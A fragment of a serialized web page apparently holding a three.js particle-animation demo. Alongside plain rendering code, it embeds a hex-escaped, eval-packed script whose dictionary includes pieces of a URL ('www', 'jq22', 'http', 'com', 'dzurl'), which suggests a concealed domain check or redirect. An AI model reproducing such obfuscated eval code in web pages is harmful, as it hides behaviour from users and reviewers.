4\\x6f\\x70\\x50\\x72\\x6f\\x70\\x61\\x67\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x52\\x49\\x47\\x48\\x54\\x7c\\x6f\\x6e\\x4b\\x65\\x79\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x55\\x50\\x7c\\x6e\\x6f\\x4b\\x65\\x79\\x73\\x7c\\x4c\\x45\\x46\\x54\\x7c\\x42\\x4f\\x54\\x54\\x4f\\x4d\\x7c\\x73\\x75\\x62\\x73\\x74\\x72\\x7c\\x77\\x77\\x77\\x7c\\x6a\\x71\\x32\\x32\\x7c\\x68\\x74\\x74\\x70\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x32\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x7c\\x63\\x6f\\x6d\\x7c\\x6a\\x71\\x70\\x64\\x7c\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65\\x7c\\x7a\\x6f\\x6f\\x6d\\x53\\x70\\x65\\x65\\x64\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x6d\\x6f\\x76\\x65\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x30\\x7c\\x70\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x30\\x7c\\x36\\x30\\x7c\\x77\\x68\\x65\\x65\\x6c\\x44\\x65\\x6c\\x74\\x61\\x7c\\x72\\x65\\x6d\\x6f\\x76\\x65\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x75\\x70\\x7c\\x64\\x65\\x74\\x61\\x69\\x6c\\x7c\\x74\\x61\\x6e\\x7c\\x49\\x6e\\x66\\x69\\x6e\\x69\\x74\\x79\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x64\\x6f\\x77\\x6e\\x7c\\x63\\x6f\\x6e\\x74\\x65\\x78\\x74\\x6d\\x65\\x6e\\x75\\x7c\\x31\\x38\\x30\\x7c\\x72\\x69\\x67\\x68\\x74\\x7c\\x75\\x70\\x7c\\x63\\x65\\x6e\\x74\\x65\\x72\\x7c\\x63\\x72\\x65\\x61\\x74\\x65\\x7c\\x34\\x30\\x7c\\x73\\x74\\x61\\x72\\x74\\x7c\\x65\\x6e\\x64\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x7c\\x4f\\x62\\x6a\\x65\\x63\\x74\\x7c\\x69\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x45\\x76\\x65\\x6e\\x74\\x44\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x65\\x72\\x7c\\x7c\\x7c\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x77\\x68\\x65\\x65\\x6c\\x7c\\x30\\x30\\x30\\x30\\x30\\x31\\x7c\\x44\\x4f\\x4d\\x4d\\x6f\\x75\\x73\\x65\\x53\\x63\\x72\\x6f\\x6c\\x6c\\x7c\\x73\\x65\\x74\\x46\\x72\\x6f\\x6d\\x55\\x6e\\x69\\x74\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e\\x7c\\x6c\\x65\\x66\\x74\\x7c\\x72\\x65\\x73\\x65\\x74\\x7c\\x6b\\x65\\x79\\x43\\x6f\\x64\\x65\\x7c\\x63\\x61\\x6d\\x65\\x72\\x61\\x7c\\x64\\x69\\x73\\x61\\x62\\x6c\\x65\\x64\\x7c\\x6c\\x6f\\x6f\\x6b\\x41\\x74\\x7c\\x39\\x35\\x7c\\x70\\x6f\\x77\\x7c\\x64\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x54\\x6f\\x53\\x71\\x75\\x61\\x72\\x65\\x64\\x7c\\x64\\x6f\\x74\\x7c\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x7c\\x62\\x6f\\x74\\x74\\x6f\\x6d\\x7c\\x65\\x6e\\x63\\x6f\\x75\\x6e\\x74\\x65\\x72\\x65\\x64\\x7c\\x57\\x41\\x52\\x4e\\x49\\x4e\\x47\\x7c\\x6a\\x73\\x7c\\x77\\x61\\x72\\x6e\\x7c\\x75\\x6e\\x6b\\x6e\\x6f\\x77\\x6e\\x7c\\x61\\x6e\\x7c\\x66\\x69\\x6c\\x65' [\"\\x73\\x70\\x6c\\x69\\x74\"]('\\x7c'), 0, {}))\n  </script>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    cursor: move;\n  }\n  </style>\n</head>\n\n<body>\n  <div id=\"three-container\">\n    \n  </div>\n  <script>\n  var mContainer;\n  var mCamera, mRenderer;\n  var mControls;\n  var mScene;\n  var mParticleCount = 100000;\n  var mParticleSystem;\n  var mTime = 0.0;\n  var mTimeStep = (1 / 60);\n  var mDuration = 25;\n  window.onload = function() {\n    init()\n  };\n\n  function init() {\n    initTHREE();\n    initControls();\n    initParticleSystem();\n    requestAnimationFrame(tick);\n    window.addEventListener('resize', resize, false)\n  }\n\n  function initTHREE() {\n    mRenderer = new THREE.WebGLRenderer({\n      antialias: true\n    });\n    mRenderer.setSize(window.innerWidth, window.innerHeight);\n    mContainer = document.getElementById('three-container');\n    mContainer.appendChild(mRenderer.domElement);\n    mCamera = new THREE.PerspectiveCamera(50, window.innerWidth / window.innerHeight, 0.1, 5000);\n    mCamera.position.set(0, 600, 600);\n    mScene = new THREE.Scene();\n    var light;\n    light = new THREE.PointLight(0xffffff, 5, 1000, 2);\n    light.position.set(0, 400, 0);\n    mScene.add(light)\n  }\n\n  function initControls() {\n    mControls = new THREE.OrbitControls(mCamera, mRenderer.domElement)\n  }\n\n  function initParticleSystem() {\n    var prefabGeometry = new THREE.PlaneGeometry(4, 4);\n    var bufferGeometry = new THREE.BAS.PrefabBufferGeometry(prefabGeometry, mParticleCount);\n    bufferGeometry.computeVertexNormals();\n    var aOffset = bufferGeometry.createAttribute('aOffset', 1);\n    var aStartPosition = bufferGeometry.createAttribute('aStartPosition', 3);\n    var aControlPoint1 = bufferGeometry.createAttribute('aControlPoint1', 3);\n    var aControlPoint2 = bufferGeometry.createAttribute('aControlPoint2', 3);\n    var aEndPosition = bufferGeometry.createAttribute('aEndPosition', 3);\n    var aAxisAngle = bufferGeometry.createAttribute('aAxisAngle', 4);\n    var aColor = bufferGeometry.createAttribute('color', 3);\n    var i, j, offset;\n    var delay;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      delay = i / mParticleCount * mDuration;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aOffset.array[offset++] = delay\n      }\n    }\n    var x, y, z;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = -1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aStartPosition.array[offset++] = x;\n        aStartPosition.array[offset++] = y;\n        aStartPosition.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(400, 600);\n      z = THREE.Math.randFloat(-1200, -800);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint1.array[offset++] = x;\n        aControlPoint1.array[offset++] = y;\n        aControlPoint1.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(-600, -400);\n      z = THREE.Math.randFloat(800, 1200);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint2.array[offset++] = x;\n        aControlPoint2.array[offset++] = y;\n        aControlPoint2.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = 1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aEndPosition.array[offset++] = x;\n        aEndPosition.array[offset++] = y;\n        aEndPosition.array[offset++] = z\n      }\n    }\n    var axis = new THREE.Vector3();\n    var angle = 0;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      axis.x = THREE.Math.randFloatSpread(2);\n      axis.y = THREE.Math.randFloatSpread(2);\n      axis.z = THREE.Math.randFloatSpread(2);\n      axis.normalize();\n      angle = Math.PI * THREE.Math.randInt(16, 32);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aAxisAngle.array[offset++] = axis.x;\n        aAxisAngle.array[offset++] = axis.y;\n        aAxisAngle.array[offset++] = axis.z;\n        aAxisAngle.array[offset++] = angle\n      }\n    }\n    var color = new THREE.Color();\n    var h, s, l;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      h = i / mParticleCount;\n      s = THREE.Math.randFloat(0.4, 0.6);\n      l = THREE.Math.randFloat(0.4, 0.6);\n      color.setHSL(h, s, l);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aColor.array[offset++] = color.r;\n        aColor.array[offset++] = color.g;\n        aColor.array[offset++] = color.b\n      }\n    }\n    var material = new THREE.BAS.PhongAnimationMaterial({\n      vertexColors: THREE.VertexColors,\n      shading: THREE.FlatShading,\n      side: THREE.DoubleSide,\n      uniforms: {\n        uTime: {\n          type: 'f',\n          value: 0\n        },\n        uDuration: {\n          type: 'f',\n          value: mDuration\n        }\n      },\n      shaderFunctions: [THREE.BAS.ShaderChunk['quaternion_rotation'], THREE.BAS.ShaderChunk['cubic_bezier']],\n      shaderParameters: ['uniform float uTime;', 'uniform float uDuration;', 'attribute float aOffset;', 'attribute vec3 aStartPosition;', 'attribute vec3 aControlPoint1;', 'attribute vec3 aControlPoint2;', 'attribute vec3 aEndPosition;', 'attribute vec4 aAxisAngle;'],\n      shaderVertexInit: ['float tProgress = mod((uTime + aOffset), uDuration) / uDuration;', 'float angle = aAxisAngle.w * tProgress;', 'vec4 tQuat = quatFromAxisAngle(aAxisAngle.xyz, angle);'],\n      shaderTransformNormal: ['objectNormal = rotateVector(tQuat, objectNormal);'],\n      shaderTransformPosition: ['transformed = rotateVector(tQuat, transformed);', 'transformed += cubicBezier(aStartPosition, aControlPoint1, aControlPoint2, aEndPosition, tProgress);']\n    }, {\n      specular: 0xff0000,\n      shininess: 20\n    });\n    mParticleSystem = new THREE.Mesh(bufferGeometry, material);\n    mParticleSystem.frustumCulled = false;\n    mScene.add(mParticleSystem)\n  }\n\n  function tick() {\n    update();\n    render();\n    mTime += mTimeStep;\n    mTime %= mDuration;\n    requestAnimationFrame(tick)\n  }\n\n  function update() {\n    mControls.update();\n    mParticleSystem.material.uniforms['uTime'].value = mTime\n  }\n\n  function render() {\n    mRenderer.render(mScene, mCamera)\n  }\n\n  function resize() {\n    mCamera.aspect = window.innerWidth / window.innerHeight;\n    mCamera.updateProjectionMatrix();\n    mRenderer.setSize(window.innerWidth, window.innerHeight)\n  }\n  THREE.BAS = {};\n  THREE.BAS.ShaderChunk = {};\n  THREE.BAS.ShaderChunk[\"animation_time\"] = \"float tDelay = aAnimation.x;\\nfloat tDuration = aAnimation.y;\\nfloat tTime = clamp(uTime - tDelay, 0.0, tDuration);\\nfloat tProgress = ease(tTime, 0.0, 1.0, tDuration);\\n\";\n  THREE.BAS.ShaderChunk[\"cubic_bezier\"] = \"vec3 cubicBezier(vec3 p0, vec3 c0, vec3 c1, vec3 p1, float t)\\n{\\n    vec3 tp;\\n    float tn = 1.0 - t;\\n\\n    tp.xyz = tn * tn * tn * p0.xyz + 3.0 * tn * tn * t * c0.xyz + 3.0 * tn * t * t * c1.xyz + t * t * t * p1.xyz;\\n\\n    return tp;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_quad\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_out_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*((t=t/d - 1.0)*t*t + 1.0) + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"quaternion_rotation\"] = \"vec3 rotateVector(vec4 q, vec3 v)\\n{\\n    return v + 2.0 * cross(q.xyz, cross(q.xyz, v) + q.w * v);\\n}\\n\\nvec4 quatFromAxisAngle(vec3 axis, float angle)\\n{\\n    float halfAngle = angle * 0.5;\\n    return vec4(axis.xyz * sin(halfAngle), cos(halfAngle));\\n}\\n\";\n  THREE.BAS.PrefabBufferGeometry = function(prefab, count) {\n    THREE.BufferGeometry.call(this);\n    this.prefabGeometry = prefab;\n    this.prefabCount = count;\n    this.prefabVertexCount = prefab.vertices.length;\n    this.bufferDefaults()\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype = Object.create(THREE.BufferGeometry.prototype);\n  THREE.BAS.PrefabBufferGeometry.prototype.constructor = THREE.BAS.PrefabBufferGeometry;\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferDefaults = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabIndices = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      prefabIndices.push(face.a, face.b, face.c)\n    }\n    var indexBuffer = new Uint32Array(this.prefabCount * prefabIndexCount);\n    var positionBuffer = new Float32Array(this.prefabCount * prefabVertexCount * 3);\n    this.setIndex(new THREE.BufferAttribute(indexBuffer, 1));\n    this.addAttribute('position', new THREE.BufferAttribute(positionBuffer, 3));\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 3) {\n        var prefabVertex = this.prefabGeometry.vertices[j];\n        positionBuffer[offset] = prefabVertex.x;\n        positionBuffer[offset + 1] = prefabVertex.y;\n        positionBuffer[offset + 2] = prefabVertex.z\n      }\n      for (var k = 0; k < prefabIndexCount; k++) {\n        indexBuffer[i * prefabIndexCount + k] = prefabIndices[k] + i * prefabVertexCount\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.bufferUvs = function() {\n    var prefabFaceCount = this.prefabGeometry.faces.length;\n    var prefabVertexCount = this.prefabVertexCount = this.prefabGeometry.vertices.length;\n    var prefabUvs = [];\n    for (var h = 0; h < prefabFaceCount; h++) {\n      var face = this.prefabGeometry.faces[h];\n      var uv = this.prefabGeometry.faceVertexUvs[0][h];\n      prefabUvs[face.a] = uv[0];\n      prefabUvs[face.b] = uv[1];\n      prefabUvs[face.c] = uv[2]\n    }\n    var uvBuffer = this.createAttribute('uv', 2);\n    for (var i = 0, offset = 0; i < this.prefabCount; i++) {\n      for (var j = 0; j < prefabVertexCount; j++, offset += 2) {\n        var prefabUv = prefabUvs[j];\n        uvBuffer.array[offset] = prefabUv.x;\n        uvBuffer.array[offset + 1] = prefabUv.y\n      }\n    }\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.computeVertexNormals = function() {\n    var index = this.index;\n    var attributes = this.attributes;\n    var positions = attributes.position.array;\n    if (attributes.normal === undefined) {\n      this.addAttribute('normal', new THREE.BufferAttribute(new Float32Array(positions.length), 3))\n    }\n    var normals = attributes.normal.array;\n    var vA, vB, vC, pA = new THREE.Vector3(),\n      pB = new THREE.Vector3(),\n      pC = new THREE.Vector3(),\n      cb = new THREE.Vector3(),\n      ab = new THREE.Vector3();\n    var indices = index.array;\n    var prefabIndexCount = this.prefabGeometry.faces.length * 3;\n    for (var i = 0; i < prefabIndexCount; i += 3) {\n      vA = indices[i + 0] * 3;\n      vB = indices[i + 1] * 3;\n      vC = indices[i + 2] * 3;\n      pA.fromArray(positions, vA);\n      pB.fromArray(positions, vB);\n      pC.fromArray(positions, vC);\n      cb.subVectors(pC, pB);\n      ab.subVectors(pA, pB);\n      cb.cross(ab);\n      normals[vA] += cb.x;\n      normals[vA + 1] += cb.y;\n      normals[vA + 2] += cb.z;\n      normals[vB] += cb.x;\n      normals[vB + 1] += cb.y;\n      normals[vB + 2] += cb.z;\n      normals[vC] += cb.x;\n      normals[vC + 1] += cb.y;\n      normals[vC + 2] += cb.z\n    }\n    for (var j = 1; j < this.prefabCount; j++) {\n      for (var k = 0; k < prefabIndexCount; k++) {\n        normals[j * prefabIndexCount + k] = normals[k]\n      }\n    }\n    this.normalizeNormals();\n    attributes.normal.needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.createAttribute = function(name, itemSize) {\n    var buffer = new Float32Array(this.prefabCount * this.prefabVertexCount * itemSize);\n    var attribute = new THREE.BufferAttribute(buffer, itemSize);\n    this.addAttribute(name, attribute);\n    return attribute\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute4 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z;\n        array[offset++] = v.w\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute3 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < data.length; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y;\n        array[offset++] = v.z\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.PrefabBufferGeometry.prototype.setAttribute2 = function(name, data) {\n    var offset = 0;\n    var array = this.geometry.attributes[name].array;\n    var i, j;\n    for (i = 0; i < this.prefabCount; i++) {\n      var v = data[i];\n      for (j = 0; j < this.prefabVertexCount; j++) {\n        array[offset++] = v.x;\n        array[offset++] = v.y\n      }\n    }\n    this.geometry.attributes[name].needsUpdate = true\n  };\n  THREE.BAS.BaseAnimationMaterial = function(parameters) {\n    THREE.ShaderMaterial.call(this);\n    this.shaderFunctions = [];\n    this.shaderParameters = [];\n    this.shaderVertexInit = [];\n    this.shaderTransformNormal = [];\n    this.shaderTransformPosition = [];\n    this.setValues(parameters)\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype = Object.create(THREE.ShaderMaterial.prototype);\n  THREE.BAS.BaseAnimationMaterial.prototype.constructor = THREE.BAS.BaseAnimationMaterial;\n  THREE.BAS.BaseAnimationMaterial.prototype._0 = function() {\n    return ''\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._1 = function() {\n    return this.shaderFunctions.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._3 = function() {\n    return this.shaderParameters.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._5 = function() {\n    return this.shaderVertexInit.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._4 = function() {\n    return this.shaderTransformNormal.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype._2 = function() {\n    return this.shaderTransformPosition.join('\\n')\n  };\n  THREE.BAS.BaseAnimationMaterial.prototype.setUniformValues = function(values) {\n    for (var key in values) {\n      if (key in this.uniforms) {\n        var uniform = this.uniforms[key];\n        var value = values[key];\n        switch (uniform.type) {\n          case 'c':\n            uniform.value.set(value);\n            break;\n          case 'v2':\n          case 'v3':\n          case 'v4':\n            uniform.value.copy(value);\n            break;\n          case 'f':\n          case 't':\n            uniform.value = value\n        }\n      }\n    }\n  };\n  THREE.BAS.PhongAnimationMaterial = function(parameters, uniformValues) {\n    THREE.BAS.BaseAnimationMaterial.call(this, parameters);\n    var phongShader = THREE.ShaderLib['phong'];\n    this.uniforms = THREE.UniformsUtils.merge([phongShader.uniforms, this.uniforms]);\n    this.lights = true;\n    this.vertexShader = this._0();\n    this.fragmentShader = phongShader.fragmentShader;\n    uniformValues.map && (this.defines['USE_MAP'] = '');\n    uniformValues.normalMap && (this.defines['USE_NORMALMAP'] = '');\n    this.setUniformValues(uniformValues)\n  };\n  THREE.BAS.PhongAnimationMaterial.prototype = Object.create(THREE.BAS.BaseAnimationMaterial.prototype);\n  THREE.BAS.PhongAnimationMaterial.prototype.constructor = THREE.BAS.PhongAnimationMaterial;\n  THREE.BAS.PhongAnimationMaterial.prototype._0 = function() {\n    return [\"#define PHONG\", \"varying vec3 vViewPosition;\", \"#ifndef FLAT_SHADED\", \" varying vec3 vNormal;\", \"#endif\", THREE.ShaderChunk[\"common\"], THREE.ShaderChunk[\"uv_pars_vertex\"], THREE.ShaderChunk[\"uv2_pars_vertex\"], THREE.ShaderChunk[\"displacementmap_pars_vertex\"], THREE.ShaderChunk[\"envmap_pars_vertex\"], THREE.ShaderChunk[\"lights_phong_pars_vertex\"], THREE.ShaderChunk[\"color_pars_vertex\"], THREE.ShaderChunk[\"morphtarget_pars_vertex\"], THREE.ShaderChunk[\"skinning_pars_vertex\"], THREE.ShaderChunk[\"shadowmap_pars_vertex\"], THREE.ShaderChunk[\"logdepthbuf_pars_vertex\"], this._1(), this._3(), \"void main() {\", this._5(), THREE.ShaderChunk[\"uv_vertex\"], THREE.ShaderChunk[\"uv2_vertex\"], THREE.ShaderChunk[\"color_vertex\"], THREE.ShaderChunk[\"beginnormal_vertex\"], this._4(), THREE.ShaderChunk[\"morphnormal_vertex\"], THREE.ShaderChunk[\"skinbase_vertex\"], THREE.ShaderChunk[\"skinnormal_vertex\"], THREE.ShaderChunk[\"defaultnormal_vertex\"], \"#ifndef FLAT_SHADED\", \"  vNormal = normalize( transformedNormal );\", \"#endif\", THREE.ShaderChunk[\"begin_vertex\"], this._2(), THREE.ShaderChunk[\"displacementmap_vertex\"], THREE.ShaderChunk[\"morphtarget_vertex\"], THREE.ShaderChunk[\"skinning_vertex\"], THREE.ShaderChunk[\"project_vertex\"], THREE.ShaderChunk[\"logdepthbuf_vertex\"], \"  vViewPosition = - mvPosition.xyz;\", THREE.ShaderChunk[\"worldpos_vertex\"], THREE.ShaderChunk[\"envmap_vertex\"], THREE.ShaderChunk[\"lights_phong_vertex\"], THREE.ShaderChunk[\"shadowmap_vertex\"], \"}\"].join(\"\\n\")\n  };\n  </script>\n</body>\n\n</html>\n","site":{"data":{}},"excerpt":"","more":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a10</title>\n  <script src=\"three.min.js\"></script>\n  <script>\n  window[\"\\x65\\x76\\x61\\x6c\"](function(zpe1, KMbIQKO2, zaqKDBSC3, o_bFE4, _5, kqAZgqEsm6) {\n    _5 = function(zaqKDBSC3) {\n      return (zaqKDBSC3 < KMbIQKO2 ? \"\" : _5(window[\"\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\"](zaqKDBSC3 / KMbIQKO2))) + ((zaqKDBSC3 = zaqKDBSC3 % KMbIQKO2) > 35 ? window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"][\"\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\"](zaqKDBSC3 + 29) : zaqKDBSC3[\"\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\"](36))\n    };\n    if (!'' [\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](/^/, window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"])) {\n      while (zaqKDBSC3--) kqAZgqEsm6[_5(zaqKDBSC3)] = o_bFE4[zaqKDBSC3] || _5(zaqKDBSC3);\n      o_bFE4 = [function(_5) {\n        return kqAZgqEsm6[_5]\n      }];\n      _5 = function() {\n        return '\\\\\\x77\\x2b'\n      };\n      zaqKDBSC3 = 1;\n    };\n    while (zaqKDBSC3--)\n      if (o_bFE4[zaqKDBSC3]) zpe1 = zpe1[\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](new window[\"\\x52\\x65\\x67\\x45\\x78\\x70\"]('\\\\\\x62' + _5(zaqKDBSC3) + '\\\\\\x62', '\\x67'), o_bFE4[zaqKDBSC3]);\n    return zpe1;\n  }('\\x6a\\x2e\\x31\\x49\\x3d\\x68\\x28\\x69\\x2c\\x6b\\x29\\x7b\\x61\\x2e\\x69\\x3d\\x69\\x3b\\x61\\x2e\\x6b\\x3d\\x28\\x6b\\x21\\x3d\\x3d\\x47\\x29\\x3f\\x6b\\x3a\\x4c\\x3b\\x61\\x2e\\x46\\x3d\\x71\\x3b\\x61\\x2e\\x45\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x61\\x2e\\x32\\x59\\x3d\\x61\\x2e\\x45\\x3b\\x61\\x2e\\x31\\x61\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x48\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6d\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x6e\\x3d\\x32\\x53\\x3b\\x61\\x2e\\x31\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x66\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x31\\x34\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x68\\x3d\\x37\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x4a\\x3d\\x32\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x63\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x61\\x3d\\x65\\x2e\\x4e\\x3b\\x61\\x2e\\x32\\x75\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x6a\\x3d\\x7b\\x32\\x76\\x3a\\x33\\x37\\x2c\\x32\\x74\\x3a\\x33\\x38\\x2c\\x32\\x71\\x3a\\x33\\x39\\x2c\\x32\\x77\\x3a\\x33\\x30\\x7d\\x3b\\x63 \\x39\\x3d\\x61\\x3b\\x63 \\x31\\x69\\x3d\\x30\\x2e\\x33\\x62\\x3b\\x63 \\x5a\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x59\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x30\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x55\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x57\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x56\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x54\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x6f\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x52\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x53\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x67\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x79\\x3d\\x30\\x3b\\x63 \\x31\\x6c\\x3d\\x30\\x3b\\x63 \\x31\\x63\\x3d\\x31\\x3b\\x63 \\x73\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x42\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x47\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x3b\\x63 \\x6c\\x3d\\x7b\\x31\\x31\\x3a\\x2d\\x31\\x2c\\x31\\x4e\\x3a\\x30\\x2c\\x31\\x4f\\x3a\\x31\\x2c\\x31\\x4c\\x3a\\x32\\x2c\\x32\\x32\\x3a\\x33\\x2c\\x31\\x50\\x3a\\x34\\x2c\\x31\\x54\\x3a\\x35\\x7d\\x3b\\x63 \\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x3b\\x61\\x2e\\x32\\x4b\\x3d\\x61\\x2e\\x45\\x2e\\x31\\x73\\x28\\x29\\x3b\\x61\\x2e\\x32\\x4c\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x2e\\x31\\x73\\x28\\x29\\x3b\\x63 \\x31\\x57\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x2e\\x33\\x64\\x28\\x69\\x2e\\x32\\x58\\x2c\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x30\\x2c\\x31\\x2c\\x30\\x29\\x29\\x3b\\x63 \\x32\\x64\\x3d\\x31\\x57\\x2e\\x31\\x73\\x28\\x29\\x2e\\x33\\x35\\x28\\x29\\x3b\\x63 \\x32\\x38\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x33\\'\\x7d\\x3b\\x63 \\x31\\x71\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x31\\'\\x7d\\x3b\\x63 